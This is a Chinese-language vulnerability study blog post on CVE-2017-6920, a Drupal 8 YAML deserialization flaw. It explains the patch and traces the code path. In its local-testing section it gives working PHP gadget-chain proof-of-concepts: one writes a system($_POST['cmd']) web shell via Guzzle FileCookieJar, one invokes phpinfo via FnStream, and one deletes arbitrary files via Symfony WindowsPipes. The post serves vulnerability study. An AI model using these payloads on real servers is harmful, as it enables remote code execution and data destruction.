# 代码审计之CVE-2017-6920 Drupal远程代码执行漏洞学习 - tr1ple - 博客园

> 原文：[https://www.cnblogs.com/tr1ple/p/10480736.html](https://www.cnblogs.com/tr1ple/p/10480736.html)

** 1.背景介绍：**

CVE-2017-6920是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。

```
Drupal介绍：
Drupal 是一个由Dries Buytaert创立的自由开源的内容管理系统，用PHP语言写成。在业界Drupal常被视为内容管理框架（CMF），而非一般意义上的内容管理系统（CMS）。
Drupal目录：
/vendor – Drupal Core所依赖的后端库
/profile – 贡献和自定义配置文件
/libraries – 第三方库
```

```
/core /lib – Drupal核心类
/core /assets – Core使用的各种外部库
/core /misc – Drupal Core所依赖的前端代码
/core /includes – 低级别为模块化的功能。比如模块系统本身
/core /modules – Drupal核心模块
/core /profiles – Drupal Core安装配置文件

```

```
YAML 介绍:
YAML是“YAML不是一种标记语言”的外语缩写，但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。
它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。
它是类似于标准通用标记语言的子集XML的数据描述语言，语法比XML简单很多。
```

**2.修复方法：**

```
static $init; if (!isset($init)) 
{ // We never want to unserialize !php/object. 
ini_set('yaml.decode_php', 0); $init = TRUE; 
} 
```

因为通过设置Init_set()，将限制yaml的decode函数的功能，从而防止反序列化php的对象类型序列化数据

**3.漏洞分析：**

在yaml.php中存在以下decode函数的调用

![](../Images/1e8da66465f663396220fccd1bbe22f3.png)

所以需要在yaml类所在的文件中找decode函数，此decode函数中调用了静态方法getSerializer()函数

![](../Images/7171e4668b756031aa97d21786b9e4e2.png)

此方法说明此时应用会判断用什么类来解析yaml数据，如果存在yaml扩展，就调用yamlpecl来处理，否则就使用yamlsymfony类来处理，此时要寻找的漏洞点

需要满足调用了yaml类的decode函数并且传给decode函数的入口参数必须是我们可以控制的，所以需要去找这样的函数

![](../Images/07c0c36911dd67bdd2233e346035539c.png)

在core/modules/config/src/Form/ConfigSingleImportForm.php中存在decode函数的调用

![](../Images/1771248d34c7d7e4745275f167102253.png)

 这里调用了$form_stare的getValue()方法，这里要求我们必须熟悉drupal这个框架，知识储备：

```
在处理表单时，有3个变量非常重要。
第一个就是$form_id，它包含了一个标识表单的字符串。
第二个就是$form，它是一个描述表单的结构化数组。
第三个就是$form_state，它包含了表单的相关信息，比如表单的值以及当表单处理完成时应该发生什么。
drupal_get_form()在开始时，首先会初始化$form_state。
```

说明$form_state变量将会存储我们在表单中提交的值，那么getValue是干啥的，我们继续跟进一下，在FormStateInterface.php中声明了getvalue函数的定义，具体的方法体在FormStateInterface.php中

![](../Images/0b94dc96b736689ce6663ec0481604ad.png)

此文件继承了FormStateInterface接口，并且使用了FormStateValuesTrait，此时又需要了解需要学trait

```
Trait 是为类似PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用method。
```

![](../Images/8d473e1acb7455dd7a36d8470926b6b2.png)

在FormStateValuesTrait.php中实现了getvalue()函数的方法体,在getvalue()函数中，将会调用NestedArray的getvalue函数，将会把我们之前"import"键所对应的值返回，即此时yaml::decode就接收到我们传递过去的payload了

![](../Images/75255eb2cfcd6ae7808f80eac2bacaed.png)

**4.本地测试：**

首先在其composer.json中寻找其加载了哪些代码库

![](../Images/04acdbc318c70c12968a77c5433c2967.png)

**1.存在guzzlehttp，因此可以利用其进行任意写文件，Guzzlehttp/guzzle代码库所存在的file_put_contents()**

```
<?php require __DIR__.'/vendor/autoload.php'; use GuzzleHttp\Cookie\FileCookieJar; use GuzzleHttp\Cookie\SetCookie; $tr1ple = new FileCookieJar('/tmp/shell.txt'); $payload = '<?php echo system($_POST[\'cmd\']); ?>'; $data=array( 'Name' => "tr1ple",
    'Value' => "Arybin",
    'Domain' => $payload,
    'Expires' => time()
); $tr1ple->setCookie(new SetCookie($data)); file_put_contents('./exp',addslashes(serialize($tr1ple)));
```

导出到文件因为直接写出来会有不可见字符, 写在tmp目录是因为所使用的docker环境，写入文件到www下权限不对，序列化后的数据必须对其中的引号进行转义

结果：

![](../Images/25941a613c8d2a0600f06f6d61623dcc.png)

注意：payload前面需要加上yaml的`!php/object` tag(注意一定要转义)，并且因为$data字段有Expire键，因此payload过一段时间将会失效，所以再次利用时需要重新生成payload

```
Expires：
Cookie 过期的时间。这是个 Unix 时间戳，即从 Unix 纪元开始的秒数。　　
换而言之，通常用 time() 函数再加上秒数来设定 cookie 的失效期。
```

**2.利用Guzzlehttp/psr中的FnStream**

![](../Images/52cb51d2b2a5f9ccdd78615e81861318.png)

如上图所示，在析构函数中，将会调用call_user_func()函数

```
call_user_func — 把第一个参数作为回调函数调用
第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。
```

而此时call_user_func()的入口参数只有一个，那么我们此时只能调用无参函数来测试，我们看一下其构造方法，入口参数为数组，并且将会遍历数组，将数组的键名前添加“_fn_”前缀，因为我们需要传递array("close"=>"phpinfo")作为入口参数

-![](../Images/7e913b703a8e4127edccf394c799d659.png)

poc如下：

```
<?php require __DIR__."/vendor/autoload.php"; use GuzzleHttp\Psr7\FnStream; $payload = array( "close" => "phpinfo" ); $tr1ple = new FnStream($payload); file_put_contents("exp1",addslashes(serialize($tr1ple)));
```

 ![](../Images/634528ef298840222a852220db518089.png)

结果：

![](../Images/f43109f199d3fb34ab2b2f9fe23f7b36.png)

![](../Images/fcd927ae6116ae367418c94d2796f231.png)

3.利用/vendor/symfony/process/Pipes/WindowsPipes.php中的unlink导致任意删除

在其89行的析构函数中，存在removeFiles()函数，我们跟进一下

![](../Images/7119b39d53675fd2bf19b5de59c4629e.png)

在196行中我们可以看到这个函数将会遍历$files变量，取出文件名，然后将文件删除，而files变量是类的私有成员变量

![](../Images/9b66d153c70902e586e418cbb1002428.png)

![](../Images/f087a4cea2440853bf2c6b9e8361264f.png)

 poc为：

这个poc并没有用到use，因为我们不需要导入windowspipes这个类，我们只需要在实例化这个类后给其私有变量赋值即可，也就是不存在给其构造函数传递参数

```
<?php
namespace Symfony\Component\Process\Pipes; class WindowsPipes{ private $files = array('/tmp/tr1ple.txt');
} $tr1ple = new WindowsPipes(); file_put_contents("exp3",addslashes(serialize($tr1ple)));
```

reference：

1.https://paper.seebug.org/334/

感想：

　　第一次尝试着去针对CVE去熟悉一个cms框架，这种学习的方法的确让人短时间了解了很多我之前都不会的知识，从接受恶意输入，到触发漏洞函数整个流程，非常可惜的一点是由于测试使用的是docker上的环境，

我想使用断点调试，但是调试docker里面的php配置起来太麻烦了，并且网上的方法不适用与目前的环境，还是自己对docker的使用不够熟悉，折腾了半天还是没能搭建成调试环境。但是也体会到开发中常用的开发技巧，

以及想要挖掘漏洞，除了需要掌握安全知识，也需要掌握一定的开发知识。